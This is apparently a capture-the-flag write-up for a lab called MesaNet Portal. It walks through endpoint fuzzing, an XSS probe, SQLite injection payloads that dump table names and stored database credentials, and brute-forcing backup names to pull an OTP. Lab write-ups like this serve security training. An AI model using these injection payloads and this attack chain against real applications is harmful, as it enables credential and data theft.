---
title: "MesaNet Portal"
date: 2026-02-08
author: Shawn Szczepkowski
---

While exploring the lab we see the ability to send and view mail and notes. As we explore some more we will also see that we have `/dev` endpoint that takes an OTP and probably does something cool. With some fuzzing we will also find a `/db` endpoint that requires some admin credentials and is not likely our initial target.

Browsing the applications nexus we see that we can access notes left by other users. If we play with different values in the app id we will notice an interesting message if we user `true` or `00000000-0000-0000-0000-000000000000`.
```sh
POST /gateway HTTP/2
Host: lab-1770597776650-bd14gm.labs-app.bugforge.io
Cookie: connect.sid=s%3AFEfCB3Fk8ZsLEN6uvwdw6Kyyap26_n1Y.%2Fs89rOraGH7NGHhwoXFMnIRKAqWAXwlz%2FgmfHXaPIPA
Content-Length: 84
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://lab-1770597776650-bd14gm.labs-app.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://lab-1770597776650-bd14gm.labs-app.bugforge.io/apps/nexus
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"id":"00000000-0000-0000-0000-000000000000",
	"endpoint":"/api/notes/list",
	"data":{
	}
}
```

```sh
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Date: Mon, 09 Feb 2026 00:45:44 GMT
Etag: W/"23-djMG3lZq/NPkB6FDRw/PmJrXJ4E"
X-Powered-By: Express
Content-Length: 35

{
	"error":"Rail endpoint not found"
}
```

Fuzzing `/api/rail/FUZZ` with the raft medium list from seclists we will see some interesting endpoints returned.
```txt
status
schedule
announcents
current
create
```

Those all return rail information except `create`. 
```sh
POST /gateway HTTP/2
Host: lab-1770597776650-bd14gm.labs-app.bugforge.io
Cookie: connect.sid=s%3AFEfCB3Fk8ZsLEN6uvwdw6Kyyap26_n1Y.%2Fs89rOraGH7NGHhwoXFMnIRKAqWAXwlz%2FgmfHXaPIPA
Content-Length: 85
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://lab-1770597776650-bd14gm.labs-app.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://lab-1770597776650-bd14gm.labs-app.bugforge.io/apps/nexus
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"id":"00000000-0000-0000-0000-000000000000",
	"endpoint":"/api/rail/create",
	"data":{
	}
}
```

```sh
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Date: Mon, 09 Feb 2026 00:51:52 GMT
Etag: W/"3f-t92XSrbi/TNB3dSH5dHsIDtY4MM"
X-Powered-By: Express
Content-Length: 63

{
	"error":"type, message, timestamp, and priority are required"
}
```

My first thought was maybe I can create a message that would execute an XSS payload, but sending `<script>alert('test')</script>` in the message field returns an interesting error.
```sh
POST /gateway HTTP/2
Host: lab-1770597776650-bd14gm.labs-app.bugforge.io
Cookie: connect.sid=s%3AFEfCB3Fk8ZsLEN6uvwdw6Kyyap26_n1Y.%2Fs89rOraGH7NGHhwoXFMnIRKAqWAXwlz%2FgmfHXaPIPA
Content-Length: 189
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://lab-1770597776650-bd14gm.labs-app.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://lab-1770597776650-bd14gm.labs-app.bugforge.io/apps/nexus
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"id":"00000000-0000-0000-0000-000000000000",
	"endpoint":"/api/rail/create",
	"data":{
	"type":"announcement",
	"timestamp":"07:00:00",
	"message":"<script>alert('test')</script>",
	"priority":"high"
	}
}
```


```sh
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Date: Mon, 09 Feb 2026 00:54:34 GMT
Etag: W/"29-SmBla7xsDDzwbEuxHEUa4iRroUw"
X-Powered-By: Express
Content-Length: 41

{
	"error":"Failed to create announcement"
}
```

We love 500 errors.

A quick SQLite test gets us SQLite results.
```sql
test' || (SELECT sqlite_version()) || '

"message":"test3.44.2"
```

Tables:
```sql
test' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') || '

"message":"testannouncements,sqlite_sequence,config"
```


Let's see what's in config:
```sql
' || (SELECT group_concat(key || ':' || value) FROM config) || '

"message":"db_username:dbadmin,db_password:REDACTED_GO_RUN_IT_YOURSELF"
```

Now that we have the db user and password, let's go back to the `/db` endpoint. 

It looks like we have the ability to download db backups.
![mesa1](/assets/images/Pasted%20image%2020260208200842.png)

I asked Claude to make me a Half-Life themed db fuzzing list and add it to the required `*Db` format. I'll share it because I'm nice:
```txt
{"database":"mainDb"}
{"database":"appDb"}
{"database":"notesDb"}
{"database":"mailDb"}
{"database":"railDb"}
{"database":"usersDb"}
{"database":"authDb"}
{"database":"adminDb"}
{"database":"systemDb"}
{"database":"mesaDb"}
{"database":"portalDb"}
{"database":"gatewayDb"}
{"database":"configDb"}
{"database":"devDb"}
{"database":"secretDb"}
{"database":"flagDb"}
{"database":"dataDb"}
{"database":"blackmesaDb"}
{"database":"black_mesaDb"}
{"database":"lambdaDb"}
{"database":"sectorDb"}
{"database":"anomalousDb"}
{"database":"nexusDb"}
{"database":"transitDb"}
{"database":"securityDb"}
{"database":"personnelDb"}
{"database":"facilityDb"}
{"database":"researchDb"}
{"database":"testDb"}
{"database":"hevDb"}
{"database":"xenDb"}
{"database":"specimenDb"}
{"database":"hazardDb"}
{"database":"containmentDb"}
{"database":"announcementDb"}
{"database":"announcementsDb"}
{"database":"scheduleDb"}
{"database":"backupDb"}
{"database":"coreDb"}
{"database":"internalDb"}
{"database":"masterDb"}
{"database":"primaryDb"}
{"database":"secondaryDb"}
{"database":"productionDb"}
{"database":"prodDb"}
{"database":"defaultDb"}
{"database":"globalDb"}
{"database":"sharedDb"}
{"database":"commonDb"}
{"database":"baseDb"}
{"database":"rootDb"}
{"database":"superDb"}
{"database":"sqliteDb"}
{"database":"databaseDb"}
{"database":"dbDb"}
{"database":"storeDb"}
{"database":"storageDb"}
{"database":"cacheDb"}
{"database":"sessionDb"}
{"database":"sessionsDb"}
{"database":"credentialDb"}
{"database":"credentialsDb"}
{"database":"credDb"}
{"database":"passwordDb"}
{"database":"passwordsDb"}
{"database":"otpDb"}
{"database":"tokenDb"}
{"database":"tokensDb"}
{"database":"keyDb"}
{"database":"keysDb"}
{"database":"userAuthDb"}
{"database":"appDataDb"}
{"database":"appMainDb"}
{"database":"siteDataDb"}
{"database":"mesaNetDb"}
{"database":"mesanetDb"}
{"database":"blackMesaDb"}
{"database":"testLabDb"}
{"database":"sectorCDb"}
{"database":"railSystemDb"}
{"database":"transitSystemDb"}
{"database":"noteStoreDb"}
{"database":"mailStoreDb"}
{"database":"railStoreDb"}
{"database":"userStoreDb"}
{"database":"appConfigDb"}
{"database":"sysConfigDb"}
{"database":"devConsoleDb"}
{"database":"dbAdminDb"}
{"database":"NexusDb"}
{"database":"MailDb"}
{"database":"RailDb"}
{"database":"NotesDb"}
{"database":"TransitDb"}
{"database":"GatewayDb"}
{"database":"PortalDb"}
{"database":"nexusAppDb"}
{"database":"mailAppDb"}
{"database":"railAppDb"}
{"database":"notesAppDb"}
{"database":"transitAppDb"}
```

By fuzzing the POST request to `/db/backup` we will get a couple of hits:
```JSON
{"database":"railDb"}
{"database":"portalDb"}
```

Download those and take a peek at the contents.

You'll notice in portalDb we have another config table. Viewing the contents we will see that we have have our OTP that we needed.
![mesa2](/assets/images/Pasted%20image%2020260208201359.png)

Now download it again and this time - time it correctly and be ready to beat the 60 second OTP clock. Once you enter the OTP in `/dev` you'll be met with the flag.
